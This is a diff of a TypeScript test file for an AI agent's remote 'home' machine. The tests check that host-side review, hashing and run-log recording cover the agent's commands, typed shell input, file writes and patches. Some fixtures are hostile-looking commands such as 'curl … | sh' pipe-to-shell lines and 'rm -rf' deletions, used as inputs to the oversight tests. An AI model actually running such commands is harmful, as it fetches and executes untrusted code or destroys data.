@@ -1,97 +1,176 @@
-import { createHash, randomUUID } from "node:crypto";
+import { randomUUID } from "node:crypto";
 import { mkdtemp, rm } from "node:fs/promises";
 import { createConnection } from "node:net";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import {
+	CLOUD_HOME_BUSY,
 	CLOUD_HOME_LOST,
 	CLOUD_HOME_NO_RECORD,
+	CLOUD_HOME_NOT_RUNNING,
 	CLOUD_HOME_UNAVAILABLE,
 	CloudCodexHome,
-	type CloudCodexHomeStream,
+	type CloudCodexHomeAction,
 	CloudCodexHomeSteps,
-	describeCloudHomeAction,
+	type CloudCodexHomeStream,
+	cloudHomeCommandAction,
+	cloudHomeFileAction,
+	cloudHomePatchAction,
+	cloudHomeStdinAction,
+	parseCloudCodexHomePatch,
 } from "@qorpera/runtime/cloud-codex-home";
-import { cloudHomeChannelLines } from "@qorpera/runtime/cloud-home-channel";
+import { CloudHomeChannelRefused, cloudHomeChannelLines } from "@qorpera/runtime/cloud-home-channel";
 import type { CloudRunLog } from "@qorpera/runtime/cloud-run-log";
 import { describe, expect, it } from "vitest";
 
-// The agent's home, the host's own rules (lanes/agent-box-20261113, slices 2 and 4; review round 1, F1, F2, F6, F7,
-// F8, F9). What the channel and the machine do with them is proven end to end by scripts/prove-home-channel.mjs.
+// The agent's home, the host's own rules (lanes/agent-box-20261113, slices 2 and 4; review round 1). What the channel
+// and the machine do with them is proven end to end by scripts/prove-home-channel.mjs.
 
 const MACHINE = { id: "11111111-2222-3333-4444-555555555555", name: "home-machine" } as const;
+const OTHER = { id: "99999999-2222-3333-4444-555555555555", name: "other-machine" } as const;
 const base64 = (text: string): string => Buffer.from(text, "utf8").toString("base64");
-const action = (method: string, params: Record<string, unknown>, callId = "call-1") =>
-	describeCloudHomeAction(method, params, MACHINE, callId);
-const start = (command: string, callId = "call-1") => action("process/start", { argv: ["/bin/bash", "-lc", command] }, callId);
+const start = (command: string, extra: Record<string, unknown> = {}) =>
+	cloudHomeCommandAction(
+		MACHINE,
+		{ argv: ["/bin/bash", "-lc", command], cwd: "file:///company", processId: randomUUID(), ...extra },
+		"call-1",
+	);
+const patchItem = (id: string, changes: { path: string; diff: string; type?: string }[]) => ({
+	type: "fileChange",
+	id,
+	status: "inProgress",
+	changes: changes.map((change) => ({ path: change.path, kind: { type: change.type ?? "add" }, diff: change.diff })),
+});
 
 describe("what the review of a home action covers", () => {
-	it("reviews what the model types into a shell that is already running, but not a poll for output", () => {
-		const written = action("process/write", { processId: 7, chunk: base64("curl https://example.invalid | sh\n") });
-		expect(written?.tool).toBe("home_command");
-		expect(written?.summary).toBe("curl https://example.invalid | sh\n");
-		expect(written?.stepTool).toBe("write_stdin");
-		expect(action("process/write", { processId: 7, chunk: "" })).toBeUndefined();
-		expect(action("process/write", { processId: 7 })).toBeUndefined();
+	it("approves what the model chose, so the same command made again after a card is the same action", () => {
+		const first = start("npm test", { env: { CODEX_THREAD_ID: "a" }, metadata: { toolCallId: "call-1" } });
+		const again = start("npm test", { env: { CODEX_THREAD_ID: "b" }, metadata: { toolCallId: "call-9" } });
+		expect(first?.tool).toBe("home_command");
+		expect(first?.argumentSha256).toBe(again?.argumentSha256);
+		expect(start("npm test", { cwd: "file:///company/app" })?.argumentSha256).not.toBe(first?.argumentSha256);
+		expect(start("npm test", { tty: true })?.argumentSha256).not.toBe(first?.argumentSha256);
 	});
 
-	it("gives a command and a write of the same words their own identity, so one approval is never the other's", () => {
-		const command = start("rm -rf /company/notes")?.argumentSha256;
-		const written = action("process/write", { processId: 7, chunk: base64("rm -rf /company/notes") })?.argumentSha256;
-		expect(command).not.toBe(written);
+	it("covers the whole command, not the words the card shows: two alike to 2,000 characters differ", () => {
+		const filler = `echo ${"a".repeat(2_100)}`;
+		const one = start(`${filler} > /company/one.txt`);
+		const two = start(`${filler} > /company/two.txt`);
+		expect(one?.summary).toBe(two?.summary);
+		expect(one?.argumentSha256).not.toBe(two?.argumentSha256);
 	});
 
-	it("covers the whole action, not the words the card shows: two long commands alike to 2,000 characters differ", () => {
-		const filler = "echo ".concat("a".repeat(2_100));
-		const first = start(`${filler} > /company/one.txt`);
-		const second = start(`${filler} > /company/two.txt`);
-		expect(first?.summary).toBe(second?.summary);
-		expect(first?.argumentSha256).not.toBe(second?.argumentSha256);
+	it("covers the machine: the same command on another machine is another action", () => {
+		const other = cloudHomeCommandAction(OTHER, { argv: ["/bin/bash", "-lc", "ls"], cwd: "file:///company" }, "c");
+		expect(other?.argumentSha256).not.toBe(start("ls")?.argumentSha256);
 	});
 
-	it("covers what is done to a file, its contents and the machine it is done on", () => {
-		const write = action("fs/writeFile", { path: "file:///company/notes/plan.md", dataBase64: base64("one") });
-		const other = action("fs/writeFile", { path: "file:///company/notes/plan.md", dataBase64: base64("two") });
-		const removed = action("fs/remove", { path: "file:///company/notes/plan.md" });
-		expect(write?.tool).toBe("home_change");
-		expect(write?.paths).toEqual(["/company/notes/plan.md"]);
-		expect(write?.argumentSha256).not.toBe(other?.argumentSha256);
-		expect(write?.argumentSha256).not.toBe(removed?.argumentSha256);
-		// The bytes themselves are never in the record: their size and digest stand for them.
-		expect(write?.argumentsText).not.toContain(base64("one"));
-		expect(write?.argumentsText).toContain(createHash("sha256").update("one").digest("hex"));
-		const elsewhere = describeCloudHomeAction(
-			"fs/writeFile",
-			{ path: "file:///company/notes/plan.md", dataBase64: base64("one") },
-			{ id: "99999999-2222-3333-4444-555555555555", name: "other-machine" },
-			"call-1",
+	it("reviews what the model types into a running shell, with the shell it goes into, but not a poll", () => {
+		const into = { command: "python3", cwd: "/company" };
+		const typed = cloudHomeStdinAction(
+			MACHINE,
+			{ processId: 7, chunk: base64("import os; os.remove('x')\n") },
+			into,
+			"c2",
 		);
-		expect(write?.argumentSha256).not.toBe(elsewhere?.argumentSha256);
+		expect(typed?.tool).toBe("home_command");
+		expect(typed?.summary).toBe("import os; os.remove('x')\n");
+		expect(JSON.parse(typed?.argumentsText ?? "{}").into.command).toBe("python3");
+		expect(typed?.step.tool).toBe("write_stdin");
+		const elsewhere = cloudHomeStdinAction(
+			MACHINE,
+			{ processId: 8, chunk: base64("import os; os.remove('x')\n") },
+			{ command: "node", cwd: "/company" },
+			"c3",
+		);
+		expect(elsewhere?.argumentSha256).not.toBe(typed?.argumentSha256);
+		expect(cloudHomeStdinAction(MACHINE, { processId: 7, chunk: "" }, into, "c4")).toBeUndefined();
+		expect(start("rm -rf /company/notes")?.argumentSha256).not.toBe(
+			cloudHomeStdinAction(MACHINE, { processId: 7, chunk: base64("rm -rf /company/notes") }, into, "c5")
+				?.argumentSha256,
+		);
+	});
+
+	it("reviews a patch once, whole, with its diffs, and keeps its step in the folder's own paths", () => {
+		const patch = parseCloudCodexHomePatch(
+			patchItem("call-7", [
+				{ path: "/company/notes/plan.md", diff: "+# Plan\n" },
+				{ path: "/company/docs/seed.md", type: "update", diff: "-old\n+new\n" },
+			]),
+		);
+		if (!patch) throw new Error("no patch");
+		const action = cloudHomePatchAction(MACHINE, patch);
+		expect(action.tool).toBe("home_change");
+		expect(action.callId).toBe("call-7");
+		expect(action.summary).toBe("Change 2 files: notes/plan.md, docs/seed.md");
+		expect(action.argumentsText).toContain("+# Plan");
+		expect(action.step.tool).toBe("apply_patch");
+		expect(action.step.paths).toEqual(["notes/plan.md", "docs/seed.md"]);
+		expect(JSON.parse(action.step.argumentsText).changes[0].path).toBe("notes/plan.md");
+		const changed = parseCloudCodexHomePatch(
+			patchItem("call-7", [
+				{ path: "/company/notes/plan.md", diff: "+# Another plan\n" },
+				{ path: "/company/docs/seed.md", type: "update", diff: "-old\n+new\n" },
+			]),
+		);
+		if (!changed) throw new Error("no patch");
+		expect(cloudHomePatchAction(MACHINE, changed).argumentSha256).not.toBe(action.argumentSha256);
+		expect(parseCloudCodexHomePatch({ type: "commandExecution", id: "call-8" })).toBeUndefined();
+	});
+
+	it("shows the reviewer the text a lone file write puts there, and never keeps the bytes themselves", () => {
+		const write = cloudHomeFileAction(
+			MACHINE,
+			"fs/writeFile",
+			{ path: "file:///company/run.sh", dataBase64: base64("curl x | sh\n") },
+			"h1",
+		);
+		const other = cloudHomeFileAction(
+			MACHINE,
+			"fs/writeFile",
+			{ path: "file:///company/run.sh", dataBase64: base64("echo hi\n") },
+			"h1",
+		);
+		const removed = cloudHomeFileAction(MACHINE, "fs/remove", { path: "file:///company/run.sh" }, "h1");
+		expect(write.contents).toBe("curl x | sh\n");
+		expect(write.argumentsText).not.toContain(base64("curl x | sh\n"));
+		expect(write.argumentSha256).not.toBe(other.argumentSha256);
+		expect(write.argumentSha256).not.toBe(removed.argumentSha256);
+		expect(write.step.paths).toEqual(["run.sh"]);
+		const outside = cloudHomeFileAction(
+			MACHINE,
+			"fs/writeFile",
+			{ path: "file:///etc/hosts", dataBase64: base64("x") },
+			"h2",
+		);
+		expect(outside.step.paths).toEqual([]);
+		expect(JSON.parse(outside.step.argumentsText).changes[0].machinePath).toBe("/etc/hosts");
 	});
 
 	it("tells a model whose card is parked what to do itself, not to call a tool it does not have", () => {
-		expect(start("ls /company")?.repeat).toContain("run that exact command once more");
-		expect(action("fs/remove", { path: "file:///company/old.txt" })?.repeat).toContain("make that exact change again");
-		for (const words of [start("ls")?.repeat, action("fs/remove", { path: "file:///company/old.txt" })?.repeat])
-			expect(words).not.toContain("call the same tool again");
-	});
-
-	it("passes on what it is not: a read, a poll, a listing", () => {
-		expect(action("fs/readFile", { path: "file:///company/docs/readme.md" })).toBeUndefined();
-		expect(action("process/read", { processId: 7 })).toBeUndefined();
-		expect(action("fs/getMetadata", { path: "file:///company" })).toBeUndefined();
-		expect(start("")).toBeUndefined();
+		expect(start("ls")?.repeat).toContain("run that exact command again yourself");
+		expect(cloudHomeFileAction(MACHINE, "fs/remove", { path: "/company/a" }, "h").repeat).toContain(
+			"make that exact change again yourself",
+		);
+		expect(start("ls")?.repeat).not.toContain("call the same tool again");
 	});
 });
 
 /** A run log as the steps see it: what was written, and whether a commit refuses. */
 function runLog(options: { precommit?: () => Promise<void> } = {}) {
-	const steps: { j: number; tool: string; argumentsText: string; result?: string; paths?: readonly string[] }[] = [];
+	const steps: {
+		j: number;
+		call: string;
+		tool: string;
+		argumentsText: string;
+		result?: string;
+		paths?: readonly string[];
+	}[] = [];
 	let next = 0;
 	const log = {
 		step(input: { call: string; tool: string; argumentsText: string; argumentSha256: string | null }) {
 			const j = next++;
-			steps.push({ j, tool: input.tool, argumentsText: input.argumentsText });
+			steps.push({ j, call: input.call, tool: input.tool, argumentsText: input.argumentsText });
 			return j;
 		},
 		async precommit(): Promise<void> {
@@ -116,31 +195,32 @@ describe("the record the run keeps of what its home did", () => {
 		await native.open(command, AbortSignal.timeout(1_000));
 		expect(steps).toHaveLength(1);
 		expect(steps[0]?.tool).toBe("exec_command");
+		expect(JSON.parse(steps[0]?.argumentsText ?? "{}").command).toBe("touch /company/one.txt");
 		expect(steps[0]?.result).toBeUndefined();
 		native.finish(command.callId, '{"status":"ok"}');
 		expect(steps[0]?.result).toBe('{"status":"ok"}');
-		expect(native.opened).toBe(1);
+		// A later word of the same call writes nothing more.
+		native.finish(command.callId, '{"status":"ok"}');
 		expect(native.finished).toBe(1);
 	});
 
-	it("keeps one step for a call however its news arrives, and gathers the paths of a patch's own changes", async () => {
+	it("keeps a call that never acted (refused, or failed before the machine) as a step of its own", () => {
 		const { steps, log } = runLog();
 		const native = new CloudCodexHomeSteps(log);
-		const first = action("fs/writeFile", { path: "file:///company/a.md", dataBase64: base64("a") }, "patch-1");
-		const second = action("fs/writeFile", { path: "file:///company/b.md", dataBase64: base64("b") }, "patch-1");
-		if (!first || !second) throw new Error("no action");
-		await native.open(first, AbortSignal.timeout(1_000));
-		await native.open(second, AbortSignal.timeout(1_000));
+		native.finish("call-x", '{"status":"error"}', {
+			tool: "exec_command",
+			argumentsText: '{"command":"rm x"}',
+			paths: [],
+		});
 		expect(steps).toHaveLength(1);
-		native.finish("patch-1", '{"status":"ok"}');
-		expect(steps[0]?.paths).toEqual(["/company/a.md", "/company/b.md"]);
-		// A command that yielded and was finished keeps its step; later news of the same call writes nothing more.
-		native.finish("patch-1", '{"status":"ok"}');
-		expect(native.finished).toBe(1);
+		expect(steps[0]).toMatchObject({ call: "call-x", tool: "exec_command", result: '{"status":"error"}' });
+		// Without word of what it was, nothing is invented.
+		native.finish("call-y", '{"status":"ok"}');
+		expect(steps).toHaveLength(1);
 	});
 
 	it("refuses the action when the run cannot keep the record: an effect with no record must not happen", async () => {
-		const { steps, log } = runLog({
+		const { log } = runLog({
 			precommit: async () => {
 				throw new Error("the run log is gone");
 			},
@@ -149,7 +229,6 @@ describe("the record the run keeps of what its home did", () => {
 		const command = start("touch /company/one.txt");
 		if (!command) throw new Error("no action");
 		await expect(native.open(command, AbortSignal.timeout(1_000))).rejects.toThrow("the run log is gone");
-		expect(steps[0]?.result).toBeUndefined();
 		expect(CLOUD_HOME_NO_RECORD).toContain("did not happen on the machine");
 	});
 });
@@ -157,7 +236,7 @@ describe("the record the run keeps of what its home did", () => {
 describe("the channel's own reader", () => {
 	it("keeps a character that arrives in two pieces whole", async () => {
 		const danish = Buffer.from("echo 'på maskinen'\n", "utf8");
-		const split = Math.max(1, danish.indexOf(Buffer.from("å", "utf8")[0] as number) + 1);
+		const split = danish.indexOf(Buffer.from("å", "utf8")) + 1;
 		async function* chunks(): AsyncGenerator<Buffer> {
 			yield danish.subarray(0, split);
 			yield danish.subarray(split);
@@ -166,37 +245,48 @@ describe("the channel's own reader", () => {
 		for await (const line of cloudHomeChannelLines(chunks())) lines.push(line);
 		expect(lines).toEqual(["echo 'på maskinen'"]);
 	});
-
-	it("refuses a line longer than a home line may be", async () => {
-		async function* chunks(): AsyncGenerator<Buffer> {
-			yield Buffer.alloc(9 * 1024 * 1024, 0x61);
-		}
-		const read = async (): Promise<void> => {
-			for await (const _line of cloudHomeChannelLines(chunks())) break;
-		};
-		await expect(read()).rejects.toThrow(/too large/i);
-	});
 });
 
-/** A machine's side of the channel this test drives by hand: what was written to it, and when its lines end. */
+/** A machine's side of the channel this test drives by hand: what was written to it, answers, and its end. */
 function fakeMachine() {
 	const written: string[] = [];
-	let end: () => void = () => undefined;
-	const ended = new Promise<void>((resolve) => {
-		end = resolve;
-	});
+	const queue: string[] = [];
+	let wake: (() => void) | undefined;
+	let ended = false;
 	const stream: CloudCodexHomeStream = {
 		write: (line) => {
 			written.push(line);
 		},
 		lines: (async function* lines() {
-			await ended;
+			for (;;) {
+				const line = queue.shift();
+				if (line !== undefined) {
+					yield line;
+					continue;
+				}
+				if (ended) return;
+				await new Promise<void>((resolve) => {
+					wake = resolve;
+				});
+			}
 		})(),
 		close: async () => {
-			end();
+			ended = true;
+			wake?.();
 		},
 	};
-	return { written, end, stream };
+	return {
+		written,
+		stream,
+		answer: (line: string) => {
+			queue.push(line);
+			wake?.();
+		},
+		end: () => {
+			ended = true;
+			wake?.();
+		},
+	};
 }
 
 /** Codex's side: connect to the home's socket, send lines, read the lines it answers with. */
@@ -215,76 +305,283 @@ function slotSide(path: string) {
 	});
 	socket.on("error", () => undefined);
 	const ready = new Promise<void>((resolve) => socket.once("connect", () => resolve()));
-	const next = async (): Promise<string> => {
+	const send = (value: unknown): void => {
+		socket.write(`${JSON.stringify(value)}\n`);
+	};
+	const next = async (): Promise<Record<string, unknown>> => {
 		for (let waited = 0; waited < 200; waited++) {
 			const line = lines.shift();
-			if (line !== undefined) return line;
+			if (line !== undefined) return JSON.parse(line) as Record<string, unknown>;
 			await new Promise((done) => setTimeout(done, 25));
 		}
 		throw new Error("the home answered nothing");
 	};
-	return { socket, ready, next };
+	return { socket, ready, send, next };
+}
+
+async function until(condition: () => boolean): Promise<void> {
+	for (let waited = 0; waited < 200 && !condition(); waited++) await new Promise((done) => setTimeout(done, 25));
+}
+
+async function withHome(
+	options: Omit<ConstructorParameters<typeof CloudCodexHome>[0], "sessionId" | "machine" | "signal">,
+	body: (home: CloudCodexHome, slot: ReturnType<typeof slotSide>) => Promise<void>,
+): Promise<void> {
+	const root = await mkdtemp(join(tmpdir(), "home-test-"));
+	const home = new CloudCodexHome({
+		...options,
+		sessionId: randomUUID(),
+		machine: MACHINE,
+		signal: new AbortController().signal,
+	});
+	try {
+		await home.listen(root);
+		const slot = slotSide(home.socketPath);
+		await slot.ready;
+		await body(home, slot);
+		slot.socket.destroy();
+	} finally {
+		await home.close();
+		await rm(root, { recursive: true, force: true });
+	}
 }
 
 describe("what the model is told when its home is not there", () => {
 	it("answers every request in words when the channel cannot be opened, instead of a dead turn", async () => {
-		const root = await mkdtemp(join(tmpdir(), "home-unavailable-"));
-		const home = new CloudCodexHome({
-			channel: {
-				open: async () => {
-					throw new Error("the ingress refused the session");
+		await withHome(
+			{
+				channel: {
+					open: async () => {
+						throw new Error("the ingress did not answer");
+					},
 				},
 			},
-			sessionId: randomUUID(),
-			machine: MACHINE,
-			signal: new AbortController().signal,
-		});
-		try {
-			await home.listen(root);
-			const slot = slotSide(home.socketPath);
-			await slot.ready;
-			slot.socket.write(`${JSON.stringify({ jsonrpc: "2.0", id: 1, method: "initialize", params: {} })}\n`);
-			const answer = JSON.parse(await slot.next()) as { id: number; error: { message: string } };
-			expect(answer.id).toBe(1);
-			expect(answer.error.message).toBe(CLOUD_HOME_UNAVAILABLE);
-			// And again, so a model that tries twice is told twice rather than left waiting.
-			slot.socket.write(`${JSON.stringify({ jsonrpc: "2.0", id: 2, method: "fs/readFile", params: {} })}\n`);
-			expect(JSON.parse(await slot.next()).error.message).toBe(CLOUD_HOME_UNAVAILABLE);
-			expect(home.failure).toBe(CLOUD_HOME_UNAVAILABLE);
-			slot.socket.destroy();
-		} finally {
-			await home.close();
-			await rm(root, { recursive: true, force: true });
-		}
+			async (home, slot) => {
+				slot.send({ id: 1, method: "initialize", params: {} });
+				expect(await slot.next()).toEqual({ id: 1, error: { code: -32010, message: CLOUD_HOME_UNAVAILABLE } });
+				slot.send({ id: 2, method: "fs/readFile", params: {} });
+				expect((await slot.next()).error).toEqual({ code: -32010, message: CLOUD_HOME_UNAVAILABLE });
+				expect(home.failure).toBe(CLOUD_HOME_UNAVAILABLE);
+			},
+		);
+	});
+
+	it("says which it is when the ingress gives a reason: not running, or busy with another run's work", async () => {
+		for (const [reason, words] of [
+			["MACHINE_NOT_RUNNING", CLOUD_HOME_NOT_RUNNING],
+			["MACHINE_BUSY_WITH_OTHER_WORK", CLOUD_HOME_BUSY],
+		] as const)
+			await withHome(
+				{
+					channel: {
+						open: async () => {
+							throw new CloudHomeChannelRefused(reason);
+						},
+					},
+				},
+				async (_home, slot) => {
+					slot.send({ id: 1, method: "initialize", params: {} });
+					expect(((await slot.next()).error as { message: string }).message).toBe(words);
+				},
+			);
 	});
 
 	it("tells the model its machine was lost mid-command, and that part of it may have happened", async () => {
-		const root = await mkdtemp(join(tmpdir(), "home-lost-"));
 		const machine = fakeMachine();
-		const home = new CloudCodexHome({
-			channel: { open: async () => machine.stream },
-			sessionId: randomUUID(),
-			machine: MACHINE,
-			signal: new AbortController().signal,
+		let opens = 0;
+		await withHome(
+			{
+				channel: {
+					open: async () => {
+						opens++;
+						if (opens === 1) return machine.stream;
+						throw new CloudHomeChannelRefused("MACHINE_NOT_RUNNING");
+					},
+				},
+			},
+			async (home, slot) => {
+				slot.send({
+					id: 7,
+					method: "process/start",
+					params: {
+						processId: "1",
+						argv: ["/bin/bash", "-lc", "make"],
+						cwd: "file:///company",
+						metadata: { toolCallId: "call-m" },
+					},
+				});
+				await until(() => machine.written.length === 1);
+				machine.end();
+				expect(await slot.next()).toEqual({ id: 7, error: { code: -32010, message: CLOUD_HOME_LOST } });
+				expect(home.counts.lost).toBe(1);
+				// The call's own output is shown the same words first, whatever Codex makes of the error.
+				expect(home.noteFor("call-m")).toBe(CLOUD_HOME_LOST);
+				// Asked again, the home is tried again; a machine that is not running is said as such, and nothing is
+				// forwarded. A call that never reached the machine is told so in its output too.
+				slot.send({ id: 8, method: "fs/readFile", params: { path: "file:///company/a" } });
+				expect(((await slot.next()).error as { message: string }).message).toBe(CLOUD_HOME_NOT_RUNNING);
+				expect(machine.written).toHaveLength(1);
+				expect(home.noteFor("call-never-reached")).toBe(CLOUD_HOME_NOT_RUNNING);
+				expect(home.noteFor("call-m")).toBeUndefined();
+			},
+		);
+	});
+
+	it("opens the channel again for the next call, and tells the new machine Codex's own handshake", async () => {
+		const first = fakeMachine();
+		const second = fakeMachine();
+		const machines = [first, second];
+		await withHome({ channel: { open: async () => (machines.shift() ?? second).stream } }, async (home, slot) => {
+			slot.send({ jsonrpc: "2.0", id: 1, method: "initialize", params: { clientName: "codex" } });
+			await until(() => first.written.length === 1);
+			first.answer(JSON.stringify({ id: 1, result: { sessionId: "s" } }));
+			expect(await slot.next()).toEqual({ id: 1, result: { sessionId: "s" } });
+			slot.send({ jsonrpc: "2.0", method: "initialized" });
+			slot.send({ id: 2, method: "fs/readFile", params: { path: "file:///company/a" } });
+			await until(() => first.written.length === 3);
+			first.end();
+			expect(((await slot.next()).error as { message: string }).message).toBe(CLOUD_HOME_LOST);
+			// The next call: a new channel, told the handshake again (its answer is the host's), then the call itself.
+			slot.send({ id: 3, method: "fs/readFile", params: { path: "file:///company/b" } });
+			await until(() => second.written.length === 1);
+			const again = JSON.parse(second.written[0] ?? "{}") as { id: string; method: string; params: unknown };
+			expect(again.method).toBe("initialize");
+			expect(again.params).toEqual({ clientName: "codex" });
+			second.answer(JSON.stringify({ id: again.id, result: { sessionId: "t" } }));
+			await until(() => second.written.length === 3);
+			expect(JSON.parse(second.written[1] ?? "{}").method).toBe("initialized");
+			expect(JSON.parse(second.written[2] ?? "{}").id).toBe(3);
+			second.answer(JSON.stringify({ id: 3, result: { dataBase64: "" } }));
+			expect(await slot.next()).toEqual({ id: 3, result: { dataBase64: "" } });
+			expect(home.noteFor("any-call")).toBeUndefined();
 		});
-		try {
-			await home.listen(root);
-			const slot = slotSide(home.socketPath);
-			await slot.ready;
-			slot.socket.write(`${JSON.stringify({ jsonrpc: "2.0", id: 7, method: "fs/readFile", params: { path: "file:///company/a" } })}\n`);
-			for (let waited = 0; waited < 100 && machine.written.length === 0; waited++)
-				await new Promise((done) => setTimeout(done, 25));
-			expect(machine.written).toHaveLength(1);
-			// The machine goes while that request is out there.
+	});
+
+	it("tells nothing of the kind when the machine answered first", async () => {
+		const machine = fakeMachine();
+		await withHome({ channel: { open: async () => machine.stream } }, async (home, slot) => {
+			slot.send({ id: 7, method: "fs/readFile", params: { path: "file:///company/a" } });
+			await until(() => machine.written.length === 1);
+			machine.answer(JSON.stringify({ result: { dataBase64: "" }, id: 7 }));
+			expect(await slot.next()).toEqual({ result: { dataBase64: "" }, id: 7 });
 			machine.end();
-			const answer = JSON.parse(await slot.next()) as { id: number; error: { message: string } };
-			expect(answer.id).toBe(7);
-			expect(answer.error.message).toBe(CLOUD_HOME_LOST);
-			expect(home.counts.lost).toBe(1);
-			slot.socket.destroy();
-		} finally {
-			await home.close();
-			await rm(root, { recursive: true, force: true });
-		}
+			await new Promise((done) => setTimeout(done, 100));
+			expect(home.counts.lost).toBe(0);
+		});
+	});
+});
+
+describe("a line typed into a running shell, whose request names no call", () => {
+	it("is the step of the write_stdin released next, and a refused one is told and kept too", async () => {
+		const machine = fakeMachine();
+		const { steps, log } = runLog();
+		await withHome(
+			{
+				channel: { open: async () => machine.stream },
+				steps: new CloudCodexHomeSteps(log),
+				review: {
+					check: async (action) =>
+						action.summary.startsWith("bad")
+							? { run: false, text: "REVIEW_DENIED: not this line." }
+							: { run: true },
+				},
+			},
+			async (home, slot) => {
+				slot.send({
+					id: 1,
+					method: "process/start",
+					params: {
+						processId: "5",
+						argv: ["/bin/bash", "-lc", "cat"],
+						cwd: "file:///company",
+						metadata: { toolCallId: "call-s" },
+					},
+				});
+				await until(() => machine.written.length === 1);
+				home.released("call-s", "env-s", true);
+				slot.send({ id: 2, method: "process/write", params: { processId: "5", chunk: base64("good\n") } });
+				await until(() => machine.written.length === 2);
+				expect(home.noteFor("call-w")).toBeUndefined();
+				home.released("call-w", "env-w", true);
+				const typed = steps.find((step) => step.tool === "write_stdin");
+				expect(typed?.result).toBe("env-w");
+				expect(JSON.parse(typed?.argumentsText ?? "{}")).toEqual({ chars: "good\n", into: "cat" });
+				slot.send({ id: 3, method: "process/write", params: { processId: "5", chunk: base64("bad\n") } });
+				expect(((await slot.next()).error as { message: string }).message).toBe("REVIEW_DENIED: not this line.");
+				expect(home.noteFor("call-x")).toBe("REVIEW_DENIED: not this line.");
+				home.released("call-x", "env-x", true);
+				expect(steps.filter((step) => step.tool === "write_stdin").map((step) => [step.call, step.result])).toEqual(
+					[
+						[typed?.call, "env-w"],
+						["call-x", "env-x"],
+					],
+				);
+				// A release of a tool of ours never takes a typed line's step.
+				home.released("call-ours", "env-ours", false);
+				expect(steps).toHaveLength(3);
+			},
+		);
+	});
+});
+
+describe("the review at the host", () => {
+	it("reviews a patch once for all its files and forwards them after it, and stops a command it declines", async () => {
+		const machine = fakeMachine();
+		const reviewed: CloudCodexHomeAction[] = [];
+		await withHome(
+			{
+				channel: { open: async () => machine.stream },
+				review: {
+					check: async (action) => {
+						reviewed.push(action);
+						return action.summary.includes("forbidden")
+							? { run: false, text: "REVIEW_DENIED: not this one." }
+							: { run: true };
+					},
+				},
+			},
+			async (home, slot) => {
+				home.noteItem("item/started", {
+					item: patchItem("call-p", [
+						{ path: "/company/notes/a.md", diff: "+a\n" },
+						{ path: "/company/notes/b.md", diff: "+b\n" },
+					]),
+				});
+				slot.send({
+					id: 1,
+					method: "fs/createDirectory",
+					params: { path: "file:///company/notes", recursive: true },
+				});
+				slot.send({
+					id: 2,
+					method: "fs/writeFile",
+					params: { path: "file:///company/notes/a.md", dataBase64: base64("a\n") },
+				});
+				slot.send({
+					id: 3,
+					method: "fs/writeFile",
+					params: { path: "file:///company/notes/b.md", dataBase64: base64("b\n") },
+				});
+				await until(() => machine.written.length === 3);
+				expect(machine.written.map((line) => JSON.parse(line).id)).toEqual([1, 2, 3]);
+				expect(reviewed.map((action) => action.callId)).toEqual(["call-p"]);
+				slot.send({
+					id: 4,
+					method: "process/start",
+					params: {
+						processId: "9",
+						argv: ["/bin/bash", "-lc", "echo forbidden"],
+						cwd: "file:///company",
+						metadata: { toolCallId: "call-c" },
+					},
+				});
+				expect(await slot.next()).toEqual({
+					id: 4,
+					error: { code: -32600, message: "REVIEW_DENIED: not this one." },
+				});
+				expect(machine.written).toHaveLength(3);
+				expect(home.counts.declined).toBe(1);
+			},
+		);
 	});
 });
